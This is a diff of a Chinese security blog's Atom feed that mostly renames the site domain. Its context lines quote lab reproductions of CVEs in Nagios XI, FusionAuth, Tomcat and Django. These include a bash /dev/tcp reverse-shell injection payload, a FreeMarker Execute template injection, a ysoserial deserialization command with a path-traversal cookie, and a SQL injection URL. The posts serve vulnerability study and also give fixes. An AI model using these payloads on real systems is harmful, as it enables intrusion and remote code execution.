@@ -1,19 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-    <id>https://c0n6w3i.github.io/</id>
+    <id>https://h31u0.github.io/</id>
     <title>Gridea</title>
-    <updated>2021-08-13T01:32:43.246Z</updated>
+    <updated>2021-08-13T02:20:30.754Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
-    <link rel="alternate" href="https://c0n6w3i.github.io/"/>
-    <link rel="self" href="https://c0n6w3i.github.io/atom.xml"/>
+    <link rel="alternate" href="https://h31u0.github.io/"/>
+    <link rel="self" href="https://h31u0.github.io/atom.xml"/>
     <subtitle>温故而知新</subtitle>
-    <logo>https://c0n6w3i.github.io/images/avatar.png</logo>
-    <icon>https://c0n6w3i.github.io/favicon.ico</icon>
+    <logo>https://h31u0.github.io/images/avatar.png</logo>
+    <icon>https://h31u0.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Gridea</rights>
     <entry>
         <title type="html"><![CDATA[使用Application verifier hook window API]]></title>
-        <id>https://c0n6w3i.github.io/post/shi-yong-application-verifier-hook-window-api/</id>
-        <link href="https://c0n6w3i.github.io/post/shi-yong-application-verifier-hook-window-api/">
+        <id>https://h31u0.github.io/post/shi-yong-application-verifier-hook-window-api/</id>
+        <link href="https://h31u0.github.io/post/shi-yong-application-verifier-hook-window-api/">
         </link>
         <updated>2021-08-12T13:23:47.000Z</updated>
         <content type="html"><![CDATA[<h2 id="介绍">介绍</h2>
@@ -98,8 +98,8 @@ int WINAPI Hook(HWND hWnd, LPWSTR lpText, LPWSTR lpCaption, UINT uType)
     </entry>
     <entry>
         <title type="html"><![CDATA[CVE-2019-20197 Nagios XI RCE]]></title>
-        <id>https://c0n6w3i.github.io/post/cve-2019-20197-nagios-xi-rce/</id>
-        <link href="https://c0n6w3i.github.io/post/cve-2019-20197-nagios-xi-rce/">
+        <id>https://h31u0.github.io/post/cve-2019-20197-nagios-xi-rce/</id>
+        <link href="https://h31u0.github.io/post/cve-2019-20197-nagios-xi-rce/">
         </link>
         <updated>2020-06-08T03:00:46.000Z</updated>
         <content type="html"><![CDATA[<h2 id="0x01-简介">0x01 简介</h2>
@@ -118,31 +118,31 @@ int WINAPI Hook(HWND hWnd, LPWSTR lpText, LPWSTR lpCaption, UINT uType)
 <li>运行安装脚本 <code>./nagiosxi/fullinstall</code></li>
 <li>本人装了三个多小时, 装好了进入 <code>http://192.168.49.133/nagiosxi</code></li>
 <li>设置时间<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628565262.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628565262.png" alt="" loading="lazy"></li>
 <li>设置用户<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628575295.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628575295.png" alt="" loading="lazy"></li>
 <li>登陆, 然后进入主界面<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628583766.png" alt="" loading="lazy"><br>
-<img src="https://c0n6w3i.github.io//post-images/1591628614092.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628583766.png" alt="" loading="lazy"><br>
+<img src="https://h31u0.github.io//post-images/1591628614092.png" alt="" loading="lazy"></li>
 <li>在自己主机上开个端口,准备接 reverse shell<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628592753.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628592753.png" alt="" loading="lazy"></li>
 </ol>
 <h2 id="0x05-漏洞复现">0x05 漏洞复现</h2>
 <ol>
 <li>进入 Schedule Page, 先随便建一个 schedule<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628622404.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628622404.png" alt="" loading="lazy"></li>
 <li>然后 edit 这个 schedule</li>
 <li>开启 Burp Suit 抓包, 配置好 proxy<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628628912.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628628912.png" alt="" loading="lazy"></li>
 <li>点击 Save, 然后去 Burp Suit 看抓包<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628636040.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628636040.png" alt="" loading="lazy"></li>
 <li><code>id</code> 后面添加 payload <code>%22%3B%2fbin%2fbash%20-l%20%3E%20%2fdev%2ftcp%2f192.168.49.131%2f2333%200%3C%261%202%3E%261%3B</code><br>
 如果 <code>id=-1</code>的话要把 <code>id</code> 改成别的<br>
 payload 为<pre><code class="language-bash">&quot;;/bin/bash -l &gt; /dev/tcp/192.168.49.131/2333 0&lt;&amp;1 2&gt;&amp;1;
 </code></pre>
 测试时用的是<code>id=test%22%3B%2fbin%2fbash%20-l%20%3E%20%2fdev%2ftcp%2f192.168.49.131%2f2333%200%3C%261%202%3E%261%3B</code></li>
 <li>forward 之后拿到 shell 看结果<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628650348.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628650348.png" alt="" loading="lazy"></li>
 </ol>
 <h2 id="0x06-修复方式">0x06 修复方式</h2>
 <p>官方建议升级到 Nagios XI 5.6.10 或更高的版本.</p>
@@ -155,8 +155,8 @@ https://s.tencent.com/research/bsafe/868.html</p>
     </entry>
     <entry>
         <title type="html"><![CDATA[CVE-2020-7799 FusionAuth RCE]]></title>
-        <id>https://c0n6w3i.github.io/post/cve-2020-7799-fusionauth-rce/</id>
-        <link href="https://c0n6w3i.github.io/post/cve-2020-7799-fusionauth-rce/">
+        <id>https://h31u0.github.io/post/cve-2020-7799-fusionauth-rce/</id>
+        <link href="https://h31u0.github.io/post/cve-2020-7799-fusionauth-rce/">
         </link>
         <updated>2020-06-08T02:56:58.000Z</updated>
         <content type="html"><![CDATA[<h2 id="0x01-简介">0x01 简介</h2>
@@ -174,21 +174,21 @@ https://s.tencent.com/research/bsafe/868.html</p>
 <li>启动 MySQL <code>/etc/init.d/mysql start</code></li>
 <li>启动 ElasticSearch <code>systemctl start elasticsearch.service</code></li>
 <li>启动 FusionAuth <code>bin/startup.sh</code><br>
-<img src="https://c0n6w3i.github.io//post-images/1591628282665.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628282665.png" alt="" loading="lazy"></li>
 <li>打开网址<code>http://127.0.0.1:9011/</code>配置 FusionAuth
 <ol>
 <li>
 <p>先配置数据库<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628295841.png" alt="" loading="lazy"></p>
+<img src="https://h31u0.github.io//post-images/1591628295841.png" alt="" loading="lazy"></p>
 </li>
 <li>
 <p>配置 Elastic Search<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628304853.png" alt="" loading="lazy"></p>
+<img src="https://h31u0.github.io//post-images/1591628304853.png" alt="" loading="lazy"></p>
 </li>
 <li>
 <p>创建好用户之后就可以登录了<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628311685.png" alt="" loading="lazy"><br>
-<img src="https://c0n6w3i.github.io//post-images/1591628325556.png" alt="" loading="lazy"></p>
+<img src="https://h31u0.github.io//post-images/1591628311685.png" alt="" loading="lazy"><br>
+<img src="https://h31u0.github.io//post-images/1591628325556.png" alt="" loading="lazy"></p>
 </li>
 </ol>
 </li>
@@ -197,17 +197,17 @@ https://s.tencent.com/research/bsafe/868.html</p>
 <p>本次使用 email template 进行测试</p>
 <ol>
 <li>进入 setting -&gt; email template<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628349900.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628349900.png" alt="" loading="lazy"></li>
 <li>随便点一个 template 的 edit<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628394616.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628394616.png" alt="" loading="lazy"></li>
 <li>开启 Burp Suit 抓包, 配置好 proxy<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628402122.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628402122.png" alt="" loading="lazy"></li>
 <li>点击 Preview, 然后去 Burp Suit 看抓包<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628411177.png" alt="" loading="lazy"><br>
-<img src="https://c0n6w3i.github.io//post-images/1591628419953.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628411177.png" alt="" loading="lazy"><br>
+<img src="https://h31u0.github.io//post-images/1591628419953.png" alt="" loading="lazy"></li>
 <li>修改 <code>emailTemplate.defaultHtmlTemplate</code> 为 <code>${&quot;freemarker.template.utility.Execute&quot;?new()(&quot;whoami&quot;)}</code></li>
 <li>forward 之后看结果<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628427868.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628427868.png" alt="" loading="lazy"></li>
 </ol>
 <h2 id="0x06-修复方式">0x06 修复方式</h2>
 <p>值得一提的是 freemarker 2.3.19 的 changelog 里显示,如果用户开启了 TemplateClassResolver.SAFER_RESOLVER 的话, 可以防止创建 freemarker.template.utility.Execute. 然而目前这并不是默认配置.</p>
@@ -219,13 +219,13 @@ https://www.anquanke.com/post/id/198036</p>
     </entry>
     <entry>
         <title type="html"><![CDATA[CVE-2020-9484 Apache Tomcat 反序列化 RCE]]></title>
-        <id>https://c0n6w3i.github.io/post/cve-2020-9484-apache-tomcat-fan-xu-lie-hua-rce/</id>
-        <link href="https://c0n6w3i.github.io/post/cve-2020-9484-apache-tomcat-fan-xu-lie-hua-rce/">
+        <id>https://h31u0.github.io/post/cve-2020-9484-apache-tomcat-fan-xu-lie-hua-rce/</id>
+        <link href="https://h31u0.github.io/post/cve-2020-9484-apache-tomcat-fan-xu-lie-hua-rce/">
         </link>
         <updated>2020-06-08T02:52:38.000Z</updated>
         <content type="html"><![CDATA[<h2 id="0x01-简介">0x01 简介</h2>
 <p>Tomcat是一个Java开发的web容器<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628093072.jpg" alt="" loading="lazy"></p>
+<img src="https://h31u0.github.io//post-images/1591628093072.jpg" alt="" loading="lazy"></p>
 <h2 id="0x02-漏洞概述">0x02 漏洞概述</h2>
 <p>这次是因为错误配置和 org.apache.catalina.session.FileStore 的 LFI 和反序列化漏洞引起的 RCE. 当配置了 org.apache.catalina.session.PersistentManager 并且使用 org.apache.catalina.session.FileStore 来储存 session 时, 用户可以通过 org.apache.catalina.session.FileStore 的一个 LFI 漏洞来读取服务器上任意以 .session结尾的文件. 然后通过反序列化来运行 .session 文件.</p>
 <p>默认情况是使用 org.apache.catalina.session.StandardManager, 将 session储存到内存. 而 PersistentManager 会将不常用的 session swap out, 从而减少内存占用.</p>
@@ -329,23 +329,23 @@ https://www.anquanke.com/post/id/198036</p>
 <li>下载 <a href="https://mvnrepository.com/artifact/org.codehaus.groovy/groovy/2.3.9">groovy-2.3.9.jar</a></li>
 <li>将 groovy-2.3.9.jar 放入 <code>/usr/local/tomcat/lib</code></li>
 <li>执行 <code>/usr/local/tomcat/bin/catalina.sh start</code> 运行 Tomcat<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628114424.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628114424.png" alt="" loading="lazy"></li>
 </ol>
 <h2 id="0x05-漏洞复现">0x05 漏洞复现</h2>
 <p>目标是在服务器上执行 <code>touch /tmp/2333</code> 假设 .session文件已经被上传到服务器的已知位置.</p>
 <ol>
 <li>下载 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 一个生成java反序列化 payload 的 .jar 包</li>
 <li>执行 <code>java -jar ysoserial-master-30099844c6-1.jar Groovy1 &quot;touch /tmp/2333&quot; &gt; /tmp/test.session</code> 生成 payload<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628167483.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628167483.png" alt="" loading="lazy"></li>
 <li>执行 <code>curl 'http://127.0.0.1:8080/index.jsp' -H 'Cookie: JSESSIONID=../../../../../tmp/test'</code><br>
-<img src="https://c0n6w3i.github.io//post-images/1591628176551.png" alt="" loading="lazy"><br>
+<img src="https://h31u0.github.io//post-images/1591628176551.png" alt="" loading="lazy"><br>
 虽然有报错但是反序列化已经执行了</li>
 <li>执行 <code>ls /tmp</code> 查看结果<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628183305.png" alt="" loading="lazy"></li>
+<img src="https://h31u0.github.io//post-images/1591628183305.png" alt="" loading="lazy"></li>
 </ol>
 <h2 id="0x06-修复方式">0x06 修复方式</h2>
 <p>对比 Tomcat 10.0.0-M4 和 Tomcat 10.0.0-M5 的 FileStore 源码可以发现做了目录验证<br>
-<img src="https://c0n6w3i.github.io//post-images/1591628193945.png" alt="" loading="lazy"></p>
+<img src="https://h31u0.github.io//post-images/1591628193945.png" alt="" loading="lazy"></p>
 <p>修复方式就是升级,或者配置WAF, 过滤掉<code>../</code>之类的字符串, 或者不使用 FileStore</p>
 <h2 id="参考链接">参考链接:</h2>
 <p>https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/<br>
@@ -356,8 +356,8 @@ https://github.com/masahiro331/CVE-2020-9484</p>
     </entry>
     <entry>
         <title type="html"><![CDATA[CVE-2020-7471 漏洞分析笔记]]></title>
-        <id>https://c0n6w3i.github.io/post/cve-2020-7471-lou-dong-fen-xi-bi-ji/</id>
-        <link href="https://c0n6w3i.github.io/post/cve-2020-7471-lou-dong-fen-xi-bi-ji/">
+        <id>https://h31u0.github.io/post/cve-2020-7471-lou-dong-fen-xi-bi-ji/</id>
+        <link href="https://h31u0.github.io/post/cve-2020-7471-lou-dong-fen-xi-bi-ji/">
         </link>
         <updated>2020-06-08T02:49:24.000Z</updated>
         <content type="html"><![CDATA[<h2 id="0x01-简介">0x01 简介</h2>
@@ -496,11 +496,11 @@ python manage.py migrate
     return HttpResponse(&quot;Payload is : &quot; + payload + &quot;\nResult is : &quot; + res, content_type=&quot;text/plain&quot;)
 </code></pre>
 <p>执行 Django 服务：<br>
-<img src="https://c0n6w3i.github.io//post-images/1591627868451.png" alt="" loading="lazy"><br>
+<img src="https://h31u0.github.io//post-images/1591627868451.png" alt="" loading="lazy"><br>
 然后去 <code>http://127.0.0.1:8000/polls/-</code><br>
-<img src="https://c0n6w3i.github.io//post-images/1591627894827.png" alt="" loading="lazy"></p>
+<img src="https://h31u0.github.io//post-images/1591627894827.png" alt="" loading="lazy"></p>
 <p>执行注入 <code>http://127.0.0.1:8000/polls/-')%20FROM%20(SELECT%20text_1,%20version()%20AS%20text_2%20FROM%20%22polls_question%22)%20AS%20polls_question%20GROUP%20BY%20%22polls_question%22.%22text_1%22%20--</code><br>
-<img src="https://c0n6w3i.github.io//post-images/1591627911892.png" alt="" loading="lazy"></p>
+<img src="https://h31u0.github.io//post-images/1591627911892.png" alt="" loading="lazy"></p>
 <h2 id="0x06-修复方式">0x06 修复方式</h2>
 <p>虽说 SQL prepared statement 可以完美防止 SQL 注入, 但是这种添加 function 的场景太过复杂,所以 Django 是用 Value函数来对 delimiter 进行过滤.<br>
 这是新版 StringAgg</p>
@@ -526,8 +526,8 @@ python manage.py migrate
     </entry>
     <entry>
         <title type="html"><![CDATA[Fastjson 反序列化 + JNDI 注入 实现远程代码执行]]></title>
-        <id>https://c0n6w3i.github.io/post/fastjson-fan-xu-lie-hua-jndi-zhu-ru-shi-xian-yuan-cheng-dai-ma-zhi-xing/</id>
-        <link href="https://c0n6w3i.github.io/post/fastjson-fan-xu-lie-hua-jndi-zhu-ru-shi-xian-yuan-cheng-dai-ma-zhi-xing/">
+        <id>https://h31u0.github.io/post/fastjson-fan-xu-lie-hua-jndi-zhu-ru-shi-xian-yuan-cheng-dai-ma-zhi-xing/</id>
+        <link href="https://h31u0.github.io/post/fastjson-fan-xu-lie-hua-jndi-zhu-ru-shi-xian-yuan-cheng-dai-ma-zhi-xing/">
         </link>
         <updated>2020-06-08T02:43:59.000Z</updated>
         <content type="html"><![CDATA[<h2 id="0x01-简介">0x01 简介</h2>
@@ -641,7 +641,7 @@ python manage.py migrate
 <p>Fastjson &lt;= 1.2.66</p>
 <h2 id="0x04-环境搭建">0x04 环境搭建</h2>
 <p>目录结构：<br>
-<img src="https://c0n6w3i.github.io//post-images/1591627649611.png" alt="" loading="lazy"></p>
+<img src="https://h31u0.github.io//post-images/1591627649611.png" alt="" loading="lazy"></p>
 <p>pom 文件:</p>
 <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
 
@@ -888,7 +888,7 @@ public class App {
 </code></pre>
 <p>先运行 server 代码, 再运行 victim 代码<br>
 运行结果:</p>
-<figure data-type="image" tabindex="1"><img src="https://c0n6w3i.github.io//post-images/1591627692333.jpg" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://h31u0.github.io//post-images/1591627692333.jpg" alt="" loading="lazy"></figure>
 <h2 id="0x06-修复方式">0x06 修复方式</h2>
 <p>AutoType 默认关闭, 不过要用到的话需要确保 AutoTypeSupport 设置正确, 删除 <code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p>
 <h2 id="参考链接">参考链接：</h2>
@@ -898,8 +898,8 @@ public class App {
     </entry>
     <entry>
         <title type="html"><![CDATA[访问控制 Policy Enforcement Point 杂谈]]></title>
-        <id>https://c0n6w3i.github.io/post/fang-wen-kong-zhi-policy-enforcement-point-za-tan/</id>
-        <link href="https://c0n6w3i.github.io/post/fang-wen-kong-zhi-policy-enforcement-point-za-tan/">
+        <id>https://h31u0.github.io/post/fang-wen-kong-zhi-policy-enforcement-point-za-tan/</id>
+        <link href="https://h31u0.github.io/post/fang-wen-kong-zhi-policy-enforcement-point-za-tan/">
         </link>
         <updated>2020-05-18T21:33:54.000Z</updated>
         <content type="html"><![CDATA[<p>本科毕业论文中的一部分涉及到 Policy Enforcement Point。因为这块资料找起来特别麻烦, 就记录一下避免遗忘。</p>
@@ -966,8 +966,8 @@ public class App {
     </entry>
     <entry>
         <title type="html"><![CDATA[Alloy Intro]]></title>
-        <id>https://c0n6w3i.github.io/post/alloy-intro/</id>
-        <link href="https://c0n6w3i.github.io/post/alloy-intro/">
+        <id>https://h31u0.github.io/post/alloy-intro/</id>
+        <link href="https://h31u0.github.io/post/alloy-intro/">
         </link>
         <updated>2019-12-28T05:13:01.000Z</updated>
         <content type="html"><![CDATA[<h1 id="0x00-前言">0x00 前言</h1>
